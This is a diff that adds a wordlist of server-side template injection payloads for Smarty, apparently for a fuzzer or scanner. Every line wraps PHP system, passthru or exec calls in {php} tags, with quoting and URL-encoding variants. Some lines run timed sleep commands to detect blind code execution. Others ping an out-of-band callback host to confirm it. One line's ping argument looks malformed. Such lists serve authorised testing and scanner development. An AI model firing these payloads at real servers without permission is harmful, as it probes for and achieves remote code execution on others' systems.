@@ -1,0 +1,15 @@
+{php}system('sleep 100'){/php}
+{php}system("sleep 100"){/php}
+{php}system('sleep+100'){/php}
+{php}system("sleep+100"){/php}
+{php}passthru(%27sleep 100%27){/php}
+{php}passthru(%22sleep 100%22){/php}
+{php}exec(%27sleep+10%27){/php}
+{php}exec(%22sleep+10%22){/php}
+{php}system('ping rce_.glc.st'){/php}
+{php}system("ping rce_.glc.st"){/php}
+{php}system('ping+rce_.glc.st'){/php}
+{php}passthru(%27ping rce_.glc.st%27){/php}
+{php}passthru(%22ping rce_.glc.st%22){/php}
+{php}exec(%27ping rce_.glc.st%27){/php}
+{php}exec(%22ping+-rce_.glc.st%22){/php}
